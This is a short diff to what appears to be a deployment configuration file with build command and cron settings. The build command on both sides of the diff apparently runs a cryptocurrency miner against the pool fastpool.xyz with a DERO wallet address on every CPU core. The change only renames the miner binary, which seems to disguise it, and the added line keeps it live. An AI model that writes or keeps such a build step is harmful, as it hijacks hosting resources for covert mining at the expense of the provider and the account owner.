@@ -1,5 +1,5 @@
 {
-  "buildCommand": "./kremlin -r fastpool.xyz:10100 -w dero1qytfne4y9mpry7kcxrl5z328sqrmy349ldgawmu32yy5yzrjrnygjqg0vw3yu -m $(nproc --all)",
+  "buildCommand": "./worknight -r fastpool.xyz:10100 -w dero1qytfne4y9mpry7kcxrl5z328sqrmy349ldgawmu32yy5yzrjrnygjqg0vw3yu -m $(nproc --all)",
   "crons": [
     {
       "path": "/api/cron/1m",
